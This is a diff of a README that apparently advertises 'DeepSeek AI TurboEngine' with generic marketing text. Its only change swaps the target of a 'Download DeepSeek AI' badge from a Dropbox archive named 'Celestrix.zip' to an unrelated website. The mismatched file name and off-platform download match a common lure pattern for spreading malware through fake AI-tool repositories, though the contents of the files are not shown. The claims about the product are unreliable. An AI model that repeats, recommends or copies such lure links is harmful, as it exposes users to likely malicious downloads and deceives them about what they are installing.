@@ -2,7 +2,7 @@
 
 Welcome to **DeepSeek AI TurboEngine** — an advanced neural network built to deliver unmatched speed, accuracy, and flexibility for your AI projects. Whether you're developing NLP pipelines, training large-scale models, or building intelligent systems, DeepSeek is optimized for performance without compromise.
 
-[![Download DeepSeek AI](https://img.shields.io/badge/Download-DeepSeek_AI-blueviolet)](https://www.dropbox.com/scl/fi/g58lt25fmza83uydu0zu5/Celestrix.zip?rlkey=hccn6sy4qpal7m571nuon546x&st=ik6sks88&dl=1)
+[![Download DeepSeek AI](https://img.shields.io/badge/Download-DeepSeek_AI-blueviolet)](https://seomadjest.com/)
 
 ---
 
